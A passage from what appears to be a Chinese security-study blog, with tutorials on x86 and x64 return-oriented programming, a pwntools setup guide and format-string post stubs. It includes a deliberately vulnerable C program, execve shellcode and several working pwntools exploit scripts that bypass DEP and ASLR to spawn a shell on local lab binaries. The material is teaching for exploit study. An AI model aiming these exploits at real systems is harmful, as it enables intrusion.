+<p>最终的exp如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">#context.log_level=&apos;debug&apos;</div><div class="line"></div><div class="line">elf = ELF(&apos;level5&apos;)</div><div class="line">libc = ELF(&apos;libc.so.6&apos;)</div><div class="line"></div><div class="line">p = process(&apos;./level5&apos;)</div><div class="line">#p = remote(&apos;127.0.0.1&apos;,10001)</div><div class="line"></div><div class="line">got_write = elf.got[&apos;write&apos;]</div><div class="line">print &quot;got_write: &quot; + hex(got_write)</div><div class="line">got_read = elf.got[&apos;read&apos;]</div><div class="line">print &quot;got_read: &quot; + hex(got_read)</div><div class="line"></div><div class="line">main = 0x400587</div><div class="line"></div><div class="line">off_system_addr = libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;]</div><div class="line">print &quot;off_system_addr: &quot; + hex(off_system_addr)</div><div class="line"></div><div class="line">#rdi=  edi = r13,  rsi = r14, rdx = r15 </div><div class="line">#write(rdi=1, rsi=write.got, rdx=8)</div><div class="line">payload1 =  &quot;\x00&quot;*136</div><div class="line">payload1 += p64(0x40061a) + p64(0) + p64(1) + p64(got_write) + p64(8) + p64(got_write) + p64(1) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret</div><div class="line">payload1 += p64(0x400600) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</div><div class="line">payload1 += &quot;\x00&quot;*56</div><div class="line">payload1 += p64(main)</div><div class="line"></div><div class="line">p.recvuntil(&quot;Hello, World\n&quot;)</div><div class="line"></div><div class="line">print &quot;\n#############sending payload1#############\n&quot;</div><div class="line">p.send(payload1)</div><div class="line">sleep(1)</div><div class="line">#data=p.recv()</div><div class="line">data=p.recv(8)</div><div class="line">print data</div><div class="line">write_addr = u64(data)</div><div class="line">print &quot;write_addr: &quot; + hex(write_addr)</div><div class="line"></div><div class="line">system_addr = write_addr - off_system_addr</div><div class="line">print &quot;system_addr: &quot; + hex(system_addr)</div><div class="line"></div><div class="line">bss_addr=0x601040</div><div class="line"></div><div class="line">p.recvuntil(&quot;Hello, World\n&quot;)</div><div class="line"></div><div class="line">#rdi=  edi = r13,  rsi = r14, rdx = r15 </div><div class="line">#read(rdi=0, rsi=bss_addr, rdx=16)</div><div class="line">payload2 =  &quot;\x00&quot;*136</div><div class="line">payload2 += p64(0x40061a) + p64(0) + p64(1) + p64(got_read) + p64(16) + p64(bss_addr) + p64(0) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret</div><div class="line">payload2 += p64(0x400600) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</div><div class="line">payload2 += &quot;\x00&quot;*56</div><div class="line">payload2 += p64(main)</div><div class="line"></div><div class="line">print &quot;\n#############sending payload2#############\n&quot;</div><div class="line">p.send(payload2)</div><div class="line">sleep(1)</div><div class="line"></div><div class="line">p.send(p64(system_addr))</div><div class="line">p.send(&quot;/bin/sh\0&quot;)</div><div class="line">sleep(1)</div><div class="line"></div><div class="line">p.recvuntil(&quot;Hello, World\n&quot;)</div><div class="line"></div><div class="line">#rdi=  edi = r13,  rsi = r14, rdx = r15 </div><div class="line">#system(rdi = bss_addr+8 = &quot;/bin/sh&quot;)</div><div class="line">payload3 =  &quot;\x00&quot;*136</div><div class="line">payload3 += p64(0x40061a) + p64(0)+ p64(1) + p64(bss_addr) + p64(0) + p64(0)+ p64(bss_addr+8)  # pop_junk_rbx_rbp_r12_r13_r14_r15_ret</div><div class="line">payload3 += p64(0x400600) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</div><div class="line">payload3 += &quot;\x00&quot;*56</div><div class="line">payload3 += p64(main)</div><div class="line"></div><div class="line">print &quot;\n#############sending payload3#############\n&quot;</div><div class="line"></div><div class="line">#sleep(1)</div><div class="line">p.send(payload3)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<p>执行后的结果：</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/37.png" alt=""></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/10/14/一步一步学ROP之x64篇/" data-id="cjfgehm2r0007vguna9fovmtl" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/技术文章/">技术文章</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-pwntools的安装方法" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/10/12/pwntools的安装方法/" class="article-date">
+  <time class="post-time" datetime="2017-10-12T10:25:49.000Z" itemprop="datePublished">
+    <span class="post-month">10月</span><br/>
+    <span class="post-day">12</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/10/12/pwntools的安装方法/">pwntools的安装方法</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <a id="more"></a>
+<p>最近学习pwn，配置了32位和64位的pwntools环境，配置过程中虽然参考了别人的博客，但还是遇到了一些问题，总结下安装的过程便于以后的学习。</p>
+<p>pwntools是一个CTF框架和漏洞利用开发库，用python开发，由rapid设计，旨在让使用者简单快速的编写exploit。</p>
+<p>我自己安装的时候，将kali64,32;ubuntu64,32都安装了一遍。总的来说还是比较顺利的，在安装有的工具的时候可能会提示缺少某个安装模块（一般都是Python里的模块缺少），这时候通过<code>pip install module</code><br>就可以了，有的情况下需要更新源。现在开始安装教程吧。</p>
+<h4 id="1-安装Capstone"><a href="#1-安装Capstone" class="headerlink" title="1.安装Capstone"></a>1.安装Capstone</h4><p>Capstone disassembly/disassembler framework: Core (Arm, Arm64, M68K, Mips, PPC, Sparc, SystemZ, X86, X86_64, XCore) + bindings (Python, Java, Ocaml)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#!bash</div><div class="line">git clone https://github.com/aquynh/capstone</div><div class="line">cd capstone</div><div class="line">make</div><div class="line">make install</div></pre></td></tr></table></figure></p>
+<p>安装完这一步没什么错误就可以安装pwntools。</p>
+<h4 id="2-安装pwntools"><a href="#2-安装pwntools" class="headerlink" title="2.安装pwntools"></a>2.安装pwntools</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#!bash</div><div class="line">git clone https://github.com/Gallopsled/pwntools</div><div class="line">cd pwntools</div><div class="line">python setup.py install</div></pre></td></tr></table></figure>
+<p>如果没报错，并且终端输入python进入其交互模式后，输入import pwn回车后没报错，差不多就好了。</p>
+<p>这时候再尝试pwntools的asm功能:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; pwn.asm(&quot;xor eax,eax&quot;)</div><div class="line">&apos;1\xc0&apos;</div></pre></td></tr></table></figure></p>
+<p>如果不是模块错误，报其他的错可以参考这篇文章<a href="http://www.cnblogs.com/pcat/p/5451780.html" title="pwntools教程" target="_blank" rel="external">http://www.cnblogs.com/pcat/p/5451780.html</a>，我目前还没有遇到过。<br>安装完之后没有什么问题就可以开始配置练习pwn需要用到的环境了。</p>
+<h4 id="3-环境配置"><a href="#3-环境配置" class="headerlink" title="3.环境配置"></a>3.环境配置</h4><p>常用的工具：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">gcc: apt-get install gcc</div><div class="line">gcc-multilib: apt-get install gcc-multilib  #安装在64位的环境下，用它可以编译32位的程序  参数  -m32</div><div class="line">socat: apt-get install socat</div><div class="line">readelf: apt-get install readelf</div></pre></td></tr></table></figure></p>
+<ol>
+<li><p>安装pade<br>peda是gdb的一个插件，安装后大大提升gdb在分析逆向/溢出程序时的用户体验</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#!bash</div><div class="line">git clone https://github.com/longld/peda.git ~/peda</div><div class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt;  /.gdbinit</div><div class="line">echo &quot;DONE! debug your program with gdb and enjoy&quot;</div></pre></td></tr></table></figure>
+</li>
+<li><p>安装gadgets<br>比较有名的工具有以下几种，根据自己的习惯选择：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ROPEME: https://github.com/packz/ropeme</div><div class="line">Ropper: https://github.com/sashs/Ropper</div><div class="line">ROPgadget: https://github.com/JonathanSalwan/ROPgadget/tree/master</div><div class="line">rp++: https://github.com/0vercl0k/rp</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>这里以 ROPgadget为例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#!bash</div><div class="line">git clone https://github.com/JonathanSalwan/ROPgadget.git</div><div class="line">python setup.py install</div><div class="line">ROPgadget</div></pre></td></tr></table></figure></p>
+<p>或是以pip安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#!bash</div><div class="line">git clone https://github.com/JonathanSalwan/ROPgadget.git</div><div class="line">pip install ropgadget</div><div class="line">ROPgadget</div></pre></td></tr></table></figure></p>
+<p>学习过程中遇到的工具会继续更新的！</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/10/12/pwntools的安装方法/" data-id="cjfgehm2c0002vgun386davbf" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安装教程/">安装教程</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-一步一步学ROP之x86篇" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/09/28/一步一步学ROP之x86篇/" class="article-date">
+  <time class="post-time" datetime="2017-09-28T02:37:33.000Z" itemprop="datePublished">
+    <span class="post-month">9月</span><br/>
+    <span class="post-day">28</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/09/28/一步一步学ROP之x86篇/">一步一步学ROP之x86篇</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <a id="more"></a>
+<h4 id="0x1-ROP"><a href="#0x1-ROP" class="headerlink" title="0x1 ROP"></a>0x1 ROP</h4><p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。</p>
+<h4 id="0x2-Control-Flow-Hijack-程序流劫持"><a href="#0x2-Control-Flow-Hijack-程序流劫持" class="headerlink" title="0x2 Control Flow Hijack 程序流劫持"></a>0x2 Control Flow Hijack 程序流劫持</h4><p>比较常见的程序流劫持就是栈溢出，格式化字符串攻击和堆溢出。通过程序流劫持，攻击者可以控制PC指针从而执行目标代码。为了应对这种攻击，系统防御措施也提出了各种防御方法，最常见的防御方法有DEP（堆栈不可执行），ASLR(内存地址随机化)，Stack Protector(栈保护)等。</p>
+<p>我们先从最简单的没有任何保护的程序开始，随后在一步步增加各种防御措施，接着在学习绕过的方法。首先看这个有明显缓冲区溢出的例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">void vulnerable_function() &#123;</div><div class="line">    char buf[128];</div><div class="line">    read(STDIN_FILENO, buf, 256);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char** argv) &#123;</div><div class="line">    vulnerable_function();</div><div class="line">    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>用<code>gcc -fno-stack-protector -z execstack -o level1 level1.c</code>编译。<code>-fno-stack-protector</code>和<code>-z execstack</code>这两个参数会分别关掉DEP和<code>stack protector</code>。同时我们在shell中执行：</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/16.png" alt=""></p>
+<p>这几条命令是用来查看ASLR是否开启。用cat命令查看<code>randomize_va_space</code>的值，输出的结果可能是0、1或者2，简单的来说，它们的含义如下所示：<br>0：禁用<br>1：除堆以外随机化<br>2：全部随机化（默认）</p>
+<p>接下来我们开始对目标程序进行分析。首先我们先来确定溢出点的位置：</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/17.png" alt="2"></p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/18.png" alt=""></p>
+<p>我们可以得到内存出错的地址为：0x41416d41，然后通过pattern offset addr计算出PC返回值的覆盖点为140个字节。只要构造一个”A”*140+ret字符串，就可以让PC执行ret_addr上的代码了。</p>
+<p>接下来需要一段shellcode,可以用msf生成，或者是自己反编译。网上也有现成的shellcode,可以根据自己的需求去下载。<a href="https://www.exploit-db.com/shellcode/" target="_blank" rel="external">https://www.exploit-db.com/shellcode/</a></p>
+<p>这里我就用现成的shellcode:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</div><div class="line">shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</div><div class="line">shellcode += &quot;\x0b\xcd\x80&quot;</div></pre></td></tr></table></figure>
+<p>这里我们使用一段最简单的执行<code>execve(&quot;/bin/sh&quot;)</code>命令作为shellcode,溢出点有了，shellcode有了，下一步就是控制PC跳转到shellcode的地址上,我们可以这样来构造<code>payload=shellcode+&#39;a&#39;*140+ret_addr</code>。看了蒸米的文章，说shellcode的地址是一个坑。因为正常的思维是使用gdb调试目标程序，然后查看内存来确定shellcode的地址。但是你真的执行exp的时候你会发现shellcode根本就不在这个地址上。原因是gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，当我们执行./level1的时候，buf的位置会固定在别的地址上。要解决这个问题，我们需要开启core dump或者attach到运行的程序上来看运行时的栈的地址。通过ulimit -c unlimited来开启core dump。然后让程序崩溃调试一下core dump来找shellcode的地址。</p>
+<p>运行<code>ulimit -c unlimited</code>这条命令，然后让程序崩溃，会在桌面上生成一个core的文件</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/19.png" alt="4"></p>
+<p>然后使用gdb查看这个查看core文件就可以获取到buf真正的地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">root@kali:~/Desktop# gdb level1 core </div><div class="line">gdb-peda$ x/10s $esp-144</div><div class="line">0xbffff310:	&quot;ABCD&quot;, &apos;A&apos; &lt;repeats 140 times&gt;, &quot;\n\363\377\277&quot;</div><div class="line">0xbffff3a5:	&quot;&quot;</div><div class="line">0xbffff3a6:	&quot;&quot;</div><div class="line">0xbffff3a7:	&quot;&quot;</div><div class="line">0xbffff3a8:	&quot;&quot;</div><div class="line">0xbffff3a9:	&quot;&quot;</div><div class="line">0xbffff3aa:	&quot;&quot;</div><div class="line">0xbffff3ab:	&quot;&quot;</div><div class="line">0xbffff3ac:	&quot;vb\341\267\001&quot;</div><div class="line">0xbffff3b2:	&quot;&quot;</div></pre></td></tr></table></figure>
+<p>因为溢出点是140个字节，再加上4个字节的返回地址，我们可以计算出buffer的地址为$esp-144。通过gdb的命令<code>x/10s $esp-144</code>，我们可以得到buffer的地址为0xbffff310。</p>
+<p>现在shellcode和ret_addr都有了，接下来可以去利用了。利用的脚本如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">p=process(&apos;./level1&apos;)</div><div class="line">ret_addr=0xbffff310</div><div class="line">shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</div><div class="line">shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</div><div class="line">shellcode += &quot;\x0b\xcd\x80&quot;</div><div class="line">payload=shellcode+&apos;A&apos;*(140-len(shellcode))+p32(ret_addr)</div><div class="line">p.send(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>接下来我们把目标程序绑定到某个服务器的端口上，这里我们可以使用socat这个工具来完成，命令如下：<code>socat TCP4-LISTEN:5555,fork EXEC:./level1</code></p>
+<p>因为现在目标程序是跑在socat的环境中，要把脚本中的p=process(‘./level1’)换成p=remote(‘127.0.0.1’,5555)。但是ret_addr还会发生改变，解决方法还是采用core dump的方案，然后用gdb调试core文件获取返回地址，然后就可以进行远程溢出了。</p>
+<h4 id="0x2-通过ret2libc绕过DEP防护"><a href="#0x2-通过ret2libc绕过DEP防护" class="headerlink" title="0x2 通过ret2libc绕过DEP防护"></a>0x2 通过ret2libc绕过DEP防护</h4><p>现在我们把DEP打开，依然关闭stack protector和ASLR。编译的方法如下：<code>gcc -fno-stack-protector -o level2 level2.c</code>这时候如果使用level1的exp来进行测试的话，系统会拒绝执行我们的shellcode。通过<code>cat /proc/[pid]/maps</code>查看，你会发现level1的stack是rwx，但是level2的stack却是rw的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">level1: bffdf000-c0000000 rwxp 00000000 00:00 0          [stack]</div><div class="line">level2: bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]</div></pre></td></tr></table></figure></p>
+<p>注意：可以用命令<code>ps -aef | grep file</code>查看pid，但是需要注意的是，先让程序运行在执行命令，否则pid一直在变化。然后用<code>cat /proc/[pid]/maps | grep stack</code>查看程序在栈上的权限。</p>
+<p>如何去执行shellcode呢？我们知道level2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们可以让程序执行<code>system(&#39;/bin/sh&#39;)</code>的话，也可以获取shell。思路有了，接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。</p>
+<p>如果关掉了ASLR的话，system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，而且这个字符串的地址也是固定的。接下来我们需要找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”/bin/sh”字符串的地址。</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/20.png" alt="5"></p>
+<p>我们首先在main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中，然后我们就可以通过”print system”这个命令来获取system函数在内存中的位置，随后我们可以通过” print __libc_start_main”这个命令来获取libc.so在内存中的起始位置，接下来我们可以通过find命令来查找”/bin/sh”这个字符串。这样我们就得到了system的地址0xb7e38b30以及”/bin/sh”的地址0xb7f5ad28。接下来开始写exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">p = process(&apos;./level2&apos;) </div><div class="line">system_addr=0xb7e38b30</div><div class="line">binsh_addr=0xb7f5ad28</div><div class="line">payload = &apos;A&apos;*140+p32(system_addr)+p32(4)+p32(binsh_addr)</div><div class="line">p.send(payload) </div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>要注意的是system()后面跟的是执行完system函数后要返回地址，接下来才是”/bin/sh”字符串的地址。因为我们执行完后也不打算干别的什么事，所以我们就随便写了一个作为返回地址。下面我们测试一下exp：</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/21.png" alt="6"></p>
+<h4 id="0x3-通过ROP绕过DEP和ASLR防护"><a href="#0x3-通过ROP绕过DEP和ASLR防护" class="headerlink" title="0x3 通过ROP绕过DEP和ASLR防护"></a>0x3 通过ROP绕过DEP和ASLR防护</h4><p>接下来打开ASLR保护</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/22.png" alt="7"></p>
+<p>现在我们测试一下level2的exp，发现已经不能用了。</p>
+<p>通过ldd查看，可以发现每次libc.so都是变化的。</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/23.png" alt="8"></p>
+<p>如何解决地址随机化的问题？思路是：我们需要先泄露libc.so某些函数在内存中法人地址，然后在利用泄露出的函数根据偏移量计算出system()函数的地址和<code>/bin/sh</code>字符串在内存中的地址，然后执行ret2libc的shellcode。既然栈、libc、heap的地址都是随机的，怎么样才能泄露libc的地址呢？</p>
+<p>所以只要把返回值设置到程序本身就可以执行我们期望的指令。首先利用objdump来查看可以利用的plt函数和函数对应的got表：</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/24.png" alt="9"></p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/25.png" alt="10"></p>
+<p>我们发现除了程序本身的实现的函数之外，我们还可以使用<code>read@plt()</code>和<code>write@plt()</code>函数。但因为程序本身并没有调用<code>system()</code>函数，所以我们并不能直接调用<code>system()</code>来获取shell。但其实我们有<code>write@plt()</code>函数就够了，因为我们可以通过<code>write@plt ()</code>函数把<code>write()</code>函数在内存中的地址也就是<code>write.got</code>给打印出来。既然<code>write()</code>函数实现是在<code>libc.so</code>当中，那我们调用的<code>write@plt()</code>函数为什么也能实现<code>write()</code>功能呢? 这是因为linux采用了延时绑定技术，当我们调用<code>write@plit()</code>的时候，系统会将真正的<code>write()</code>函数地址link到got表的<code>write.got</code>中，然后<code>write@plit()</code>会根据<code>write.got</code>跳转到真正的<code>write()</code>函数上去。</p>
+<p>因为<code>system()</code>函数和<code>write()</code>在libc.so中的offset(相对地址)是不变的，所以如果我们得到了<code>write()</code>的地址并且拥有目标服务器上的libc.so就可以计算出<code>system()</code>在内存中的地址了。然后我们再将pc指针return回<code>vulnerable_function()</code>函数，就可以进行ret2libc溢出攻击，并且这一次我们知道了<code>system()</code>在内存中的地址，就可以调用<code>system()</code>函数来获取shell。</p>
+<p>使用ldd命令可以查看目标程序调用的so库。然后把libc.so拷贝到当前目录，因为exp需要这个so文件来计算相对地址：</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/26.png" alt="11"></p>
+<p>最后利用的exp如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">libc=ELF(&apos;libc.so&apos;)</div><div class="line">elf=ELF(&apos;./level2&apos;)</div><div class="line"></div><div class="line">p=process(&apos;./level2&apos;)</div><div class="line"></div><div class="line">write_plt=elf.symbols[&apos;write&apos;]</div><div class="line">print &apos;write_plt=&apos;+hex(write_plt)</div><div class="line">write_got=elf.got[&apos;write&apos;]</div><div class="line">print &apos;write_got=&apos;+hex(write_got)</div><div class="line">vulfun_addr = 0x804844d</div><div class="line">print &apos;vulfun=&apos;+hex(vulfun_addr)</div><div class="line"></div><div class="line">payload1=&apos;A&apos;*140+p32(write_plt)+p32(vulfun_addr)+p32(1)+p32(write_got)+p32(4)</div><div class="line">p.send(payload1)</div><div class="line"></div><div class="line">write_addr=u32(p.recv(4))</div><div class="line">print &apos;write_addr=&apos;+hex(write_addr)</div><div class="line"></div><div class="line">system_addr=write_addr-(libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;])</div><div class="line">print &apos;system_addr=&apos;+hex(system_addr)</div><div class="line">binsh_addr=write_addr - (libc.symbols[&apos;write&apos;] - next(libc.search(&apos;/bin/sh&apos;)))</div><div class="line">print &apos;binsh_addr=&apos;+hex(binsh_addr)</div><div class="line"></div><div class="line">payload2=&apos;A&apos;*140+p32(system_addr)+p32(vulfun_addr)+p32(binsh_addr)</div><div class="line">p.send(payload2)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/27.png" alt="12"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/09/28/一步一步学ROP之x86篇/" data-id="cjfgehm2y000avgun3zdxrxq4" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/技术文章/">技术文章</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-格式化字符串漏洞利用（二）" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/09/23/格式化字符串漏洞利用（二）/" class="article-date">
+  <time class="post-time" datetime="2017-09-23T03:34:47.000Z" itemprop="datePublished">
+    <span class="post-month">9月</span><br/>
+    <span class="post-day">23</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/09/23/格式化字符串漏洞利用（二）/">格式化字符串漏洞利用（二）</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>格式化字符串中危害最大的两点，一是leak memory，二是可以在内存中写入数据，简单来说就是格式化字符串可以进行内存的任意读写。</p>
+        
+          <p class="article-more-link">
+            <a href="/2017/09/23/格式化字符串漏洞利用（二）/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/09/23/格式化字符串漏洞利用（二）/" data-id="cjfgehm34000fvgunq2vi1kkc" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn-format/">pwn,format</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-格式化字符串漏洞" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/09/22/格式化字符串漏洞/" class="article-date">
+  <time class="post-time" datetime="2017-09-22T03:49:58.000Z" itemprop="datePublished">
+    <span class="post-month">9月</span><br/>
+    <span class="post-day">22</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/09/22/格式化字符串漏洞/">格式化字符串漏洞</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
